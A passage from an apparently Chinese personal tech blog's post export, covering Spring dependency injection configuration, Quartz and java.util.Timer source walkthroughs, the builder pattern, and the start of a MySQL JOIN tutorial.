&lt;/bean&gt;第二种：set方法注入 &lt;bean id=&quot;compactDisc&quot; class=&quot;soundsystem.properties.BlankDisc&quot;&gt; &lt;property name=&quot;title&quot; value=&quot;Sgt. Pepper&apos;s Lonely Hearts Club Band&quot; /&gt; &lt;property name=&quot;artist&quot; value=&quot;The Beatles&quot; /&gt; &lt;property name=&quot;tracks&quot;&gt; &lt;list&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friends&lt;/value&gt; &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt; &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt; &lt;value&gt;Within You Without You&lt;/value&gt; &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt; &lt;value&gt;Lovely Rita&lt;/value&gt; &lt;value&gt;Good Morning Good Morning&lt;/value&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt; &lt;value&gt;A Day in the Life&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt;2.简化版：构造器c命名空间 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:c=&quot;http://www.springframework.org/schema/c&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;cd&quot; class=&quot;com.husky.spring.BlankDisc&quot; c:_0=&quot;Sgt. pepper&apos;s lonely Hearts Club band&quot; c:_1=&quot;The Beatles&quot;/&gt; &lt;bean id=&quot;cdplayer&quot; class=&quot;com.husky.spring.CDPlayer&quot; c:cd-ref=&quot;cd&quot;/&gt; &lt;/beans&gt;记得在beans里面导入 xmlns:c=“ http://www.springframework.org/schema/c ”set方法p命名空间 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.properties.BlankDisc&quot; p:title=&quot;Sgt. pepper&apos;s Lonely Hearts Club Band&quot; p:artist=&quot;The Beatles&quot;&gt; &lt;property name=&quot;tracks&quot;&gt; &lt;list&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friends&lt;/value&gt; &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt; &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt; &lt;value&gt;Within You Without You&lt;/value&gt; &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt; &lt;value&gt;Lovely Rita&lt;/value&gt; &lt;value&gt;Good Morning Good Morning&lt;/value&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt; &lt;value&gt;A Day in the Life&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.properties.CDPlayer&quot; p:compactDisc-ref=&quot;compactDisc&quot;/&gt; &lt;/beans&gt;记得导入xmlns:p=“ http://www.springframework.org/schema/p ”集合：util命名空间 _spring的配置文件中util命名空间类似于java.util包类对应，util命名空间提供了集合相关的配置 _ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xmlns:util=&quot;http://www.springframework.org/schema/util&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt; &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.properties.BlankDisc&quot; p:title=&quot;sgt. Pepper&apos;s Lonely Hearts Club Band&quot; p:artist=&quot;The Peppers&quot; p:tracks-ref=&quot;trackList&quot;/&gt; &lt;util:list id=&quot;trackList&quot;&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friends&lt;/value&gt; &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt; &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt; &lt;value&gt;Within You Without You&lt;/value&gt; &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt; &lt;value&gt;Lovely Rita&lt;/value&gt; &lt;value&gt;Good Morning Good Morning&lt;/value&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt; &lt;value&gt;A Day in the Life&lt;/value&gt; &lt;/util:list&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.properties.CDPlayer&quot; p:compactDisc-ref=&quot;compactDisc&quot;/&gt; &lt;/beans&gt;混合注入1.在xml中导入javaconfig @Configuration public class CDPlayerConfig { @Bean public CDPlayer cdPlayer(CompactDisc compactDisc){ return new CDPlayer(compactDisc); } } &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:c=&quot;http://www.springframework.org/schema/c&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean class=&quot;com.husky.spring.CDConfig&quot;/&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.CDPlayer&quot; c:cd-ref=&quot;compactDisc&quot;/&gt; &lt;/beans&gt;也就是在xml中直接将这个javaconfig直接注册成bean2.在java中注入xmlconfigxmlconfig &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:c=&quot;http://www.springframework.org/schema/c&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.BlankDisc&quot; c:_0=&quot;Sgt. perpper&apos;s Lonely Hearts Club band&quot; c:_1=&quot;The beatles&quot;&gt; &lt;/bean&gt; &lt;/beans&gt; package com.husky.spring; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; /** * @author husky * @date 2018/10/22 15:25 */ @Configuration public class CDConfig { @Bean public CompactDisc compactDisc(){ return new SgtPeppers(); } } @Configuration @Import(CDPlayerConfig.class) @ImportResource(locations = {&quot;classpath:cd-config.xml&quot;}) public class SoundSystemConfig { }通过import来导入进来 具体源码 javaconfig [ xmlconfig ](https://github.com/pompeii666/learnspring/tree/master/husky-xmlconfig)[ mixedconfig ](https://github.com/pompeii666/learnspring/tree/master/husky-mixedconfig)","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"spring依赖注入（1）-自动注入","slug":"spring依赖注入（1）-自动注入","date":"2018-10-17T09:59:08.000Z","updated":"2020-11-14T17:11:12.083Z","comments":true,"path":"2018/10/17/spring依赖注入（1）-自动注入/","link":"","permalink":"http://yoursite.com/2018/10/17/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/","excerpt":"","text":"在需要添加自动注入的类加入注解@Component在类中，如果需要注入别的类，这个时候声明别的类，然后添加@AutoWried具体例子 @Component public class CDPlayer implements MediaPlayer { @AutoWried private CompactDisc cd; @Override public void play() { cd.play(); } }系统在扫描时，发现@Component注解会将CDPlayer放入应用上下文，而在扫描到@AutoWried时，会将应用上下文中的ComPactDisc注入到里面 *spring当中配置分为：javaConfig和xml而在javaConfig * @Configuration @ComponentScan public class CDPlayerConfig { }此处使用@CompontScan注解，会去寻找当前CDPlayer所在位置的包里面的各个类，并进行注解扫描，当然CDPlayerConfig也被扫描到了，因为它使用了@Configuration注解。。当然@CompontScan也可以设置扫描具体的包，可以注解里面添加配置（具体遇到再说） xml配置 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;context:component-scan base-package=&quot;com.husky.spring&quot;/&gt; &lt;/beans&gt;具体测试的时候可以使用这个注解@ContextConfiguration(classes=CDPlayerConfig.class)或者@ContextConfiguration(locations = “classpath:spring/soundsystem.xml”) /** * @author husky * @date 2018/10/17 16:31 */ @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(classes=CDPlayerConfig.class) public class CDPlayerJavaConfigTest { @Rule public final StandardOutputStreamLog log = new StandardOutputStreamLog(); @Autowired private MediaPlayer player; @Autowired private CompactDisc cd; @Test public void cdShouldNotBeNull(){ assertNotNull(cd); } @Test public void play(){ player.play(); assertEquals(&quot;Playing Sgt . Pepper&apos;s Lonely Hearts Club Band by The Beatles\\n&quot;,log.getLog()); } }具体autoconfig在 github","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"spring介绍","slug":"spring介绍","date":"2018-10-17T09:27:53.000Z","updated":"2020-11-14T17:11:12.585Z","comments":true,"path":"2018/10/17/spring介绍/","link":"","permalink":"http://yoursite.com/2018/10/17/spring%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"Spring最根本的使命简化java开发 基于POJO的轻量级和最小侵入性编程 通过依赖注入和面向接口实现松耦合 基于切面和惯例进行声明式编程 通过切面和模板减少样板式代码 POJO：Plain Ordinary Java Object 简单的java对象，是指那些没有继承任何类、也没有被其他框架侵入的java对象。当然一些类实现了Serializable接口，Cloneable接口、、等等都算是POJO为什么会有POJO呢，就以我们公司的例子为例，javaBean里面是十分复杂的。还有听前辈说什么EJB的繁杂。于是回归纯洁老式的JavaBean，即有无构造参数，每个字段有getter和setter的java类。POJO不用实现其他接口，也就是侵入很少的。如果是xml配置的，可以直接将xml去除投入其他项目，并不会导致程序出现大的缺陷。依赖注入任何一个有实际意义的应用都会由两个或者多个类组成，这些类之间进行协助来完成特定的业务逻辑传统做法 ：直接new一个对象。缺点：高度耦合，难以测试依赖注入 ：对象的依赖关系由系统中负责协调各对象的第三方组件在创建对象的时候进行设定，对象无需自行创建或管理它们的依赖关系。spring是通过应用上下文将bean定义，并把这些bean组装起来。优点：松耦合，易测试。具体测试，这个地方，我们可以使用mockito-core这个包等等，只是举个栗子。 好了，下面关于aop之类的信息，再随后的日子里会进行介绍，今天就介绍一下ioc的大概意思","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"quartz源码阅读（一），先开坑","slug":"quartz源码阅读（一），先开坑","date":"2018-10-10T12:07:27.000Z","updated":"2020-11-14T17:11:13.127Z","comments":true,"path":"2018/10/10/quartz源码阅读（一），先开坑/","link":"","permalink":"http://yoursite.com/2018/10/10/quartz%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%8C%E5%85%88%E5%BC%80%E5%9D%91/","excerpt":"","text":"首先，我使用的quartz的版本 &lt;dependency&gt; &lt;groupId&gt;org.quartz-scheduler&lt;/groupId&gt; &lt;artifactId&gt;quartz&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt; &lt;/dependency&gt;首先，main函数 public static void main(String[] args) throws SchedulerException { //1.创建schedulerFactory的工厂 SchedulerFactory schedulerFactory = new StdSchedulerFactory(); //2.从工厂中获取调度器实例 Scheduler scheduler = schedulerFactory.getScheduler(); //创建JobDetail JobDetail jobDetail = JobBuilder.newJob(RAMJob.class) .withDescription(&quot;this is a ram job&quot;) .withIdentity(&quot;ramjob&quot;,&quot;ramGroup&quot;) .build(); //任务运行的时间，simpleSchedle类型触发器有效 long time = System.currentTimeMillis() + 3 * 1000L; Date startTime = new Date(time); //创建Trigger //使用SimpleScheduleBuilder或者CronSchedulerBuilder Trigger trigger = TriggerBuilder.newTrigger() .withDescription(&quot;触发器&quot;) .withIdentity(&quot;ramTrigger&quot;,&quot;ramTriggerGroup&quot;) .startAt(startTime) .withSchedule(CronScheduleBuilder.cronSchedule(&quot;0/2 * * * * ?&quot;)) .build(); //注册任务和定时器 scheduler.scheduleJob(jobDetail,trigger); //启动调度器 scheduler.start(); log.info(&quot;启动时间：&quot;+sdf.format(new Date())); } SchedulerFactory schedulerFactory = new StdSchedulerFactory(); 创建作业调度的工厂类： 首先看StdSchedulerFactory constants：变量 太多了，等会用到再来看 constructors：构造方法 /** 生成一个没有未初始化的StdSchedulerFactory */ public StdSchedulerFactory() /** 下面这两个，其实是一个直接的Properties类型的，另一个是这个properties的fileName， 其实就是通过InputStream解析这个文件将封装一个出properties，最后还是通过 initialize(props); 给变量：private PropertiesParser cfg；赋值 this.cfg = new PropertiesParser(props); */ public StdSchedulerFactory(Properties props) throws SchedulerException { initialize(props); } public StdSchedulerFactory(String fileName) throws SchedulerException { initialize(fileName); } //2.从工厂中获取调度器实例 Scheduler scheduler = schedulerFactory.getScheduler(); public Scheduler getScheduler() throws SchedulerException { if (cfg == null) { initialize();//此次会去解析是否有quartz.proterties文件，如果有则用你的，如果没有，那就会用他jar包中的 在org/quartz/quartz.properties /** By default a properties file named &quot;quartz.properties&quot; is loaded from * the &apos;current working directory&apos;. If that fails, then the * &quot;quartz.properties&quot; file located (as a resource) in the org/quartz * package is loaded. If you wish to use a file other than these defaults, * you must define the system property &apos;org.quartz.properties&apos; to point to * the file you want. */ //quartz.properties中大致涉及：线程池中的线程数，线程优先级，具体可以看 // https://www.jianshu.com/p/14f86c6efe22 } SchedulerRepository schedRep = SchedulerRepository.getInstance(); Scheduler sched = schedRep.lookup(getSchedulerName()); if (sched != null) { if (sched.isShutdown()) { schedRep.remove(getSchedulerName()); } else { return sched; } } sched = instantiate(); return sched; } //会生成一个Scheduler接口实现的的StdScheduler 在StdScheduler中有个变量： private QuartzScheduler sched; This is the heart of Quartz, an indirect implementation of the &lt;code&gt;{@link org.quartz.Scheduler}&lt;/code&gt; quartz的中心，间接的实现了Scheduler接口 StdScheduler里面的调用方法，都是使用QuartzScheduler里面的方法 划重点QuartzScheduler这个类，有点复杂，后面再讲 下面看JobDetail 关于Jobdetail和Trigger的介绍 /** Quartz does not store an actual instance of a &lt;code&gt;Job&lt;/code&gt; class, but * instead allows you to define an instance of one, through the use of a &lt;code&gt;JobDetail&lt;/code&gt;. quartz中不保存一个真实的job类，但是可以通过jobdetail来定义一个实例 * &lt;code&gt;Job&lt;/code&gt;s have a name and group associated with them, which * should uniquely identify them within a single &lt;code&gt;{@link Scheduler}&lt;/code&gt;. job需要一个name和group来关联他们， &lt;code&gt;Trigger&lt;/code&gt;s are the &apos;mechanism&apos; by which &lt;code&gt;Job&lt;/code&gt;s * are scheduled. Many &lt;code&gt;Trigger&lt;/code&gt;s can point to the same &lt;code&gt;Job&lt;/code&gt;, * but a single &lt;code&gt;Trigger&lt;/code&gt; can only point to one &lt;code&gt;Job&lt;/code&gt;. 触发器是jobs的调度的机制。一个job可以对应多个Trigger，但是trigger只可以对应一个job *///创建JobDetail JobDetail jobDetail = JobBuilder.newJob(RAMJob.class) .withDescription(&quot;this is a ram job&quot;) .withIdentity(&quot;ramjob&quot;,&quot;ramGroup&quot;) .build(); 使用构造器模式： 新建一个JobDetailImpl//创建Trigger //使用SimpleScheduleBuilder或者CronSchedulerBuilder Trigger trigger = TriggerBuilder.newTrigger() .withDescription(&quot;触发器&quot;) .withIdentity(&quot;ramTrigger&quot;,&quot;ramTriggerGroup&quot;) .startAt(startTime) .withSchedule(CronScheduleBuilder.cronSchedule(&quot;0/2 * * * * ?&quot;)) .build(); 其中在TriggerBuilder中的withSchedule()方法 /** * Set the {@link ScheduleBuilder} that will be used to define the * Trigger&apos;s schedule. * * &lt;p&gt;The particular &lt;code&gt;SchedulerBuilder&lt;/code&gt; used will dictate * the concrete type of Trigger that is produced by the TriggerBuilder.&lt;/p&gt; * @param schedBuilder the SchedulerBuilder to use. * @return the updated TriggerBuilder * @see ScheduleBuilder * @see SimpleScheduleBuilder * @see CronScheduleBuilder * @see CalendarIntervalScheduleBuilder * 是根据里面，来确定Trigger接口实现类的类型 其中，这个cron里面的解析&quot;0/2 * * * * ?&quot;：是通过CronExpression.java中的buildExpression方法来解析的 在CronTriggerImpl中会 @Deprecated public CronTriggerImpl(String name, String group, String cronExpression) throws ParseException { super(name, group);//name和group setCronExpression(cronExpression);//解析cron字符串 setStartTime(new Date());//当前时间 setTimeZone(TimeZone.getDefault());//当前时区 }//注册任务和定时器 scheduler.scheduleJob(jobDetail,trigger); 其实是调用的是QuartzScheduler中的 public Date scheduleJob(JobDetail jobDetail, Trigger trigger) throws SchedulerException方法 resources.getJobStore().storeJobAndTrigger(jobDetail, trig);//存储job and trigger到jobStore notifySchedulerListenersJobAdded(jobDetail);//添加jobDetail到调度监听器 notifySchedulerThread(trigger.getNextFireTime().getTime());//通知调度器下一刻调度时间 notifySchedulerListenersSchduled(trigger);//添加trigger到调度监听器//启动调度器 scheduler.start(); public void start() throws SchedulerException { if (shuttingDown|| closed) { throw new SchedulerException( &quot;The Scheduler cannot be restarted after shutdown() has been called.&quot;); } // QTZ-212 : calling new schedulerStarting() method on the listeners // right after entering start() notifySchedulerListenersStarting();//通知调度监听器正在启动 if (initialStart == null) { initialStart = new Date(); this.resources.getJobStore().schedulerStarted(); // startPlugins(); } else { resources.getJobStore().schedulerResumed(); } schedThread.togglePause(false); getLog().info( &quot;Scheduler &quot; + resources.getUniqueIdentifier() + &quot; started.&quot;); notifySchedulerListenersStarted();//通知调度监听器已经启动 }start()这个方法明天再看，回去看QGhappy vs BA黑凤梨2018.10.10卖萌日","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"Timer定时调用","slug":"Timer定时调用","date":"2018-09-18T09:32:30.000Z","updated":"2020-11-14T17:11:13.715Z","comments":true,"path":"2018/09/18/Timer定时调用/","link":"","permalink":"http://yoursite.com/2018/09/18/Timer%E5%AE%9A%E6%97%B6%E8%B0%83%E7%94%A8/","excerpt":"","text":"1. 具体实例继承TimerTask抽象类 实现两个子类TimerJob和TimerJob2 package com.husky.timer; import java.text.SimpleDateFormat; import java.util.Date; import java.util.TimerTask; /** * @author husky * @date 2018/9/17 9:41 */ public class TimerJob extends TimerTask { @Override public void run() { System.out.println(&quot;当前执行的任务是TimerJob&quot;); Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); System.out.println(&quot;Current time : &quot;+sf.format(date)); System.out.println(&quot;当前线程： &quot;+Thread.currentThread().getName()); } } package com.husky.timer; import java.text.SimpleDateFormat; import java.util.Date; import java.util.TimerTask; /** * @author husky * @date 2018/9/17 10:40 */ public class TimerJob2 extends TimerTask { @Override public void run() { System.out.println(&quot;当前执行的任务是TimerJob2&quot;); Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); System.out.println(&quot;Current time : &quot;+sf.format(date)); System.out.println(&quot;当前线程： &quot;+Thread.currentThread().getName()); } }测试类 public class TimerRun { public static void main(String[] args) { Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); System.out.println(&quot;Current time:&quot;+sf.format(date)); System.out.println(Thread.currentThread().getName()); System.out.println(&quot;开始执行定时任务=======&quot;); Timer timer = new Timer(); TimerJob timerJob = new TimerJob(); TimerJob2 timerJob2 = new TimerJob2(); timer.schedule(timerJob,3000,2000); timer.schedule(timerJob2,5000,3000); } } /** 运行结果： Current time:2018-09-18 16:11:08 main 开始执行定时任务======= 当前执行的任务是TimerJob Current time : 2018-09-18 16:11:11 当前线程： Timer-0 当前执行的任务是TimerJob Current time : 2018-09-18 16:11:13 当前线程： Timer-0 当前执行的任务是TimerJob2 Current time : 2018-09-18 16:11:13 当前线程： Timer-0 当前执行的任务是TimerJob Current time : 2018-09-18 16:11:15 当前线程： Timer-0 当前执行的任务是TimerJob2 Current time : 2018-09-18 16:11:16 当前线程： Timer-0 */具体源码分析：首先分析Timer： 成员变量 private final TaskQueue queue = new TaskQueue(); //该对象是封装了TimerTask的数组，实现类似于list /**class TaskQueue { private TimerTask[] queue = new TimerTask[128]; private int size = 0; 该对象也可以通过他的add方法，进行数组扩容 */ private final TimerThread thread = new TimerThread(queue); //这个线程是等待timerqueue上的task，执行一次任务，重复执行任务，以及移除一些任务 //这个类很重要，等会具体分析 构造函数 public Timer() { this(&quot;Timer-&quot; + serialNumber()); } public Timer(boolean isDaemon) { this(&quot;Timer-&quot; + serialNumber(), isDaemon); } public Timer(String name) { thread.setName(name); thread.start(); } public Timer(String name, boolean isDaemon) { thread.setName(name); thread.setDaemon(isDaemon); thread.start();//从这儿可以看出，启动了TimerThread线程 } 重要方法 public void schedule(TimerTask task, long delay, long period) { if (delay &lt; 0) throw new IllegalArgumentException(&quot;Negative delay.&quot;); if (period &lt;= 0) throw new IllegalArgumentException(&quot;Non-positive period.&quot;); sched(task, System.currentTimeMillis()+delay, -period); } //此处将delay加上当前时间，获取执行时间 private void sched(TimerTask task, long time, long period) { if (time &lt; 0) throw new IllegalArgumentException(&quot;Illegal execution time.&quot;); // Constrain value of period sufficiently to prevent numeric // overflow while still being effectively infinitely large. if (Math.abs(period) &gt; (Long.MAX_VALUE &gt;&gt; 1)) period &gt;&gt;= 1; synchronized(queue) { if (!thread.newTasksMayBeScheduled) throw new IllegalStateException(&quot;Timer already cancelled.&quot;); synchronized(task.lock) { if (task.state != TimerTask.VIRGIN) throw new IllegalStateException( &quot;Task already scheduled or cancelled&quot;); task.nextExecutionTime = time; task.period = period; task.state = TimerTask.SCHEDULED; } queue.add(task);//将TimerTask的子类放入到TimerQueue中 if (queue.getMin() == task) queue.notify(); } }好了，上面实现了添加任务，下面就是执行了，我们来分析TimerThread 大致 class TimerThread extends Thread { boolean newTasksMayBeScheduled = true; private TaskQueue queue; TimerThread(TaskQueue queue) { this.queue = queue; } public void run() { try { mainLoop(); } finally { // Someone killed this Thread, behave as if Timer cancelled //意外杀死了线程，表现的像Timer注销 synchronized(queue) { newTasksMayBeScheduled = false; queue.clear(); // Eliminate obsolete references } } } 具体分析mainLoop方法 private void mainLoop() { while (true) { try { TimerTask task; boolean taskFired; synchronized(queue) { // Wait for queue to become non-empty while (queue.isEmpty() &amp;&amp; newTasksMayBeScheduled) queue.wait(); if (queue.isEmpty()) break; // Queue is empty and will forever remain; die //如果一直没有task进入数组，die // Queue nonempty; look at first evt and do the right thing long currentTime, executionTime; task = queue.getMin(); //获取TimerQueue中最前的task，也就是执行时间最近的 synchronized(task.lock) { if (task.state == TimerTask.CANCELLED) { queue.removeMin(); continue; // No action required, poll queue again } currentTime = System.currentTimeMillis(); executionTime = task.nextExecutionTime; if (taskFired = (executionTime&lt;=currentTime)) { if (task.period == 0) { // Non-repeating, remove//判断是否要重复执行，不需要直接remove queue.removeMin(); task.state = TimerTask.EXECUTED;//更改task状态 } else { // Repeating task, reschedule queue.rescheduleMin( task.period&lt;0 ? currentTime - task.period : executionTime + task.period);//更改重复执行的task的下一次的运行时间 } } } if (!taskFired) // Task hasn&apos;t yet fired; wait//如果还没到执行时间，等待 queue.wait(executionTime - currentTime); } if (taskFired) // Task fired; run it, holding no locks task.run();//task运行 //，这边使用的是run（）而不是start（），也就是说run方法是简单的方法，要按照顺序执行，而不是线程的run方法,在这个地方并没有对run方法进行try/catch } catch(InterruptedException e) { } } }缺陷分析Timer是单线程案例：有两个重复任务（repeat task），task1正常任务，task2会抛出异常，第一个是先执行的，而第二个后执行的，如果正常执行，执行的顺序task1 ，task1 ，task2，task1 ，task1，。。。,当执行到task2时，抛出异常，而我们在运行的时候，在TimerThread的mainLoop中的task.run（），我们并没有进行trycatch，也就是说，一旦出现异常，我们没有捕获，timer-0这个线程就会终止，而timer有时单线程，也就是会出现程序异常终止。 因为，自己的底子一般般，博文中的一些术语可能使用错误，或者有字打错，望指正。","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"Timer","slug":"Timer","permalink":"http://yoursite.com/tags/Timer/"},{"name":"定时任务","slug":"定时任务","permalink":"http://yoursite.com/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"}]},{"title":"构造器模式","slug":"构造器模式","date":"2018-09-12T12:21:13.000Z","updated":"2020-11-14T17:11:14.193Z","comments":true,"path":"2018/09/12/构造器模式/","link":"","permalink":"http://yoursite.com/2018/09/12/%E6%9E%84%E9%80%A0%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"平常我们新建对象的时候，一般是直接 Student student = new Student(&quot;zhangsan&quot;,11,new Date(),&quot;男&quot;);这样的代码可读性极差。 使用构造器模式 Student student = new Student .StudentBuilder(&quot;张三&quot;) .date(new Date()) .address(&quot;江苏&quot;) .gender(&quot;男&quot;) .build();这样让人可以在看代码的时候，一目了然下面是具体代码实现：（很简单的啦） package com.husky.pojo; import java.util.Date; /** * @author husky * @date 2018/9/12 19:47 */ public class Student { private String name; private Date date; private String address; private String gender; public Student() { super(); } public Student(StudentBuilder studentBuilder) { this.name = studentBuilder.name; this.date = studentBuilder.date; this.address = studentBuilder.address; this.gender = studentBuilder.gender; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Date getDate() { return date; } public void setDate(Date date) { this.date = date; } public String getAddress() { return address; } public void setAddress(String address) { this.address = address; } public String getGender() { return gender; } public void setGender(String gender) { this.gender = gender; } @Override public String toString() { return &quot;Student{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &quot;, date=&quot; + date + &quot;, address=&apos;&quot; + address + &apos;\\&apos;&apos; + &quot;, gender=&apos;&quot; + gender + &apos;\\&apos;&apos; + &apos;}&apos;; } public static class StudentBuilder { private String name; private Date date; private String address; private String gender; public String getName() { return name; } public Date getDate() { return date; } public String getAddress() { return address; } public String getGender() { return gender; } public StudentBuilder(String name){ this.name = name; } public StudentBuilder date(Date date){ this.date = date; return this; } public StudentBuilder address(String address){ this.address = address; return this; } public StudentBuilder gender(String gender){ this.gender = gender; return this; } public Student build(){ return new Student(this); } } }测试 Student student = new Student .StudentBuilder(&quot;张三&quot;) .date(new Date()) .address(&quot;江苏&quot;) .gender(&quot;男&quot;) .build(); System.out.println(student);这种写法有点像jdk8的流式写法，但是缺点却是很显然，自己写builder的时候十分烦躁，代码冗余","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"构造器模式","slug":"构造器模式","permalink":"http://yoursite.com/tags/%E6%9E%84%E9%80%A0%E5%99%A8%E6%A8%A1%E5%BC%8F/"}]},{"title":"mysql中join的连接方式","slug":"mysql中join的连接方式","date":"2018-08-18T12:34:01.000Z","updated":"2020-11-14T17:11:15.686Z","comments":true,"path":"2018/08/18/mysql中join的连接方式/","link":"","permalink":"http://yoursite.com/2018/08/18/mysql%E4%B8%ADjoin%E7%9A%84%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"在sql中有4中方式INNER JOIN(JOIN)LEFT JOINRIGHT JOINFULL OUTER JOIN(mysql中不支持) 首先建表 这些东西还是自己搞一遍比较好下面是建表语句 create table names( id int primary key auto_increment, name varchar(20) not null ); create table addresses( id int primary key auto_increment, address varchar(20) not null ); insert into names values(1,&apos;Google&apos;); insert into names values(2,&apos;Taobao&apos;); insert into names values(3,&apos;Weibo&apos;); insert into names values(4,&apos;Facebook&apos;); insert into addresses values(1,&apos;USA&apos;); insert into addresses values(5,&apos;CHINA&apos;); insert into addresses values(3,&apos;CHINA&apos;); insert into addressesnames values(6,&apos;USA&apos;); INNER JOIN内连接是最常见的一种连接，只连接匹配的行inner join与join是相同的 SELECT * FROM names INNER JOIN addresses ON names.id = addresses.id; SELECT * FROM names JOIN addresses ON names.id = addresses.id; LEFT 